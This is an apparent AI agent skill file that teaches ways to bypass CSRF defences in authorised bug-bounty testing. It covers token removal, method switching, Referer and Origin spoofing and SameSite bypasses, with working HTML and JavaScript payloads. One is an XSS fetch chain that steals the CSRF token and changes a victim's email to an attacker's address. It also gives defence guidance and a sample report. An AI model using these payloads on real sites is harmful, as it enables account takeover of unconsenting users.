---
name: csrf-token-bypass-techniques
description: >
  Identify and exploit Cross-Site Request Forgery (CSRF) vulnerabilities by bypassing weak or flawed
  anti-CSRF token implementations, SameSite cookie attributes, and Origin/Referer headers. Use this skill
  when testing state-changing web application endpoints for session riding attacks. Covers token removal,
  token fixation, multipart manipulation, and chaining with XSS for complete bypass.
domain: cybersecurity
subdomain: bug-hunting
category: Web Vulnerabilities
difficulty: intermediate
estimated_time: "2-4 hours"
mitre_attack:
  tactics: [TA0001, TA0040]
  techniques: [T1185, T1189]
platforms: [linux, windows, macos]
tags: [csrf, session-riding, web-vulnerabilities, bug-bounty, token-bypass, samesite]
tools: [burpsuite, html, javascript]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# CSRF Token Bypass Techniques

## When to Use
- When testing web applications that perform state-changing actions (password changes, email updates, transfers)
- When evaluating the robustness of anti-CSRF tokens and defenses
- During bug bounty hunting to chain vulnerabilities (e.g., Clickjacking to CSRF, Self-XSS to stored XSS via CSRF)
- When reviewing API implementations handling cookie-based sessions without proper headers


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Identification & Baseline Testing

```
# 1. Identify state-changing requests
# Look for POST/PUT/DELETE requests that modify data (e.g., Update Profile)
# Ensure the session relies on Cookies (if it strictly uses Authorization: Bearer tokens in headers, it's generally not vulnerable to pure CSRF)

# 2. Test for anti-CSRF presence
# Generate a CSRF PoC using Burp Suite (Right-click request -> Engagement tools -> Generate CSRF PoC)
# Save as HTML, open in a different browser authenticated as the victim.
# If it works immediately, there is no CSRF protection.

# 3. Analyze the token
# Does the application use a hidden field, a custom header (X-CSRF-Token), or dual-submit cookies?
```

### Phase 2: Token Validation Bypasses

```
# If the token is present and blocking the request, test these common implementation flaws using Burp Repeater:

# Bypass 1: Remove the token entirely
# Delete the CSRF token parameter/header from the request.
# Flaw: The backend often only validates the token IF it is present.

# Bypass 2: Change the request method
# Change POST to GET (Right-click -> Change request method).
# Flaw: The framework might enforce CSRF protection only on POST requests, but the endpoint might accept GET parameters.

# Bypass 3: Modify the token length/format
# Delete one character from the token or submit a blank value (csrf="").
# Submit an invalid token of the same length to ensure validation is actually occurring.

# Bypass 4: Token tying to user session
# Log in as Attacker, grab Attacker's valid CSRF token.
# Log in as Victim, use Attacker's token in Victim's request.
# Flaw: The token pool is global and not tied to the specific user's session cookie.

# Bypass 5: Double Submit Cookie Flaws
# If the app uses Double Submit (Token in Cookie == Token in Body)
# Can you set a cookie on the target domain (via sub-domain takeover, HTTP header injection, or XSS)?
# If yes, inject your own known token into the victim's cookie, and use that same token in the CSRF form.
```

### Phase 3: Referer and Origin Header Bypasses

```
# If tokens aren't used, the app might rely on the Referer or Origin headers.

# Bypass 1: Remove the Referer header entirely
# Many apps check the Referer but allow the request if the header is absent (for privacy reasons).
<meta name="referrer" content="no-referrer">

# Bypass 2: Referer pattern matching weakness
# If the app expects: Referer: https://target.com
# Try registering: target.com.attacker.com
# Try creating a folder: attacker.com/target.com
# Try adding parameters: attacker.com/?url=target.com

# Bypass 3: Origin header bypass
# Change Origin to null.
<iframe src="data:text/html,...csrf_form_here..."></iframe> # Causes Origin: null
```

### Phase 4: Bypassing SameSite Cookie Attributes

```
# SameSite dictates when cookies are sent in cross-site requests.
# Strict: Never sent. Lax (modern default): Sent on top-level navigations (GET). None: Always sent (must be Secure).

# Bypass 1: SameSite=Lax (GET Requests)
# If you found a GET-based CSRF (Phase 2, Bypass 2), Lax will not stop it if it's a top-level navigation.
<script>document.location="https://target.com/update_email?email=hacker@evil.com";</script>

# Bypass 2: SameSite=Lax (Method Override)
# If the framework accepts method overrides, use a GET request to bypass Lax, but tell the framework it's a POST.
<script>document.location="https://target.com/api/update?email=evil@evil.com&_method=POST";</script>

# Bypass 3: Cookie Refresh / Expiration
# Sometimes SameSite=Lax cookies are given a "grace period" of 2 minutes immediately after login (Chrome specific behavior in the past, highly context dependent).
```

### Phase 5: Chaining with XSS (The Ultimate Bypass)

```javascript
# If you find XSS anywhere on the domain or a trusted sub-domain, CSRF tokens offer NO protection.
# You can use XMLHTTPRequest/Fetch to dynamically read the token and make the request.

// Example XSS payload to bypass CSRF and change email:
fetch('/profile') // 1. Fetch the page containing the token
.then(response => response.text())
.then(text => {
    // 2. Extract the token using regex
    let token = text.match(/name="csrf_token" value="(.*?)"/)[1];
    
    // 3. Make the forged request
    fetch('/update_email', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `email=hacker@evil.com&csrf_token=${token}`
    });
});
```


## 🔵 Blue Team Detection & Defense
- **Enforcement**: Validate CSRF tokens strictly. Reject requests where the token is absent, empty, or fails cryptographic validation.
- **Session Tying**: Cryptographically tie the CSRF token to the user's secure session identifier.
- **Defense in Depth**: Use `SameSite=Strict` or `Lax` on all session cookies.
- **Custom Headers**: For APIs, require a custom header (e.g., `X-Requested-With`) and rely on CORS policies rather than tokens.
- **Re-authentication**: Require user password input for highly sensitive actions (password change, fund transfer).

## Key Concepts
| Concept | Description |
|---------|-------------|
| CSRF | Forcing an authenticated user to execute unwanted actions on a web application |
| Anti-CSRF Token | A unique, unpredictable, session-specific string generated by the server to validate state-changing requests |
| SameSite Attribute | A cookie attribute instructing the browser whether to send cookies with cross-site requests |
| Double Submit | A defense pattern where a random value is sent both in a cookie and a request parameter |
| Clickjacking | Tricking a user into clicking a button on a hidden iframe (often an alternative when CSRF fails) |

## Output Format
```
Vulnerability Report
=====================
Title: Cross-Site Request Forgery (CSRF) on Email Update Endpoint via Token Omission
Severity: HIGH
Endpoint: POST /api/user/settings/email

Description:
The application implements an anti-CSRF token on the profile update form. However, the backend validation logic only checks the token if the `_csrf` parameter is present in the POST body. By completely removing the parameter, the server processes the request successfully.

Reproduction Steps:
1. Log in to victim account.
2. Open the malicious HTML file containing an auto-submitting form targeting `/api/user/settings/email` without the `_csrf` field.
3. Observe that the user's email is successfully changed to the attacker's without user interaction or knowledge.

Impact:
An attacker can perform full account takeover by changing the victim's email address and initiating a password reset.
```


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- OWASP: [Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- PortSwigger: [Bypassing CSRF Token validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
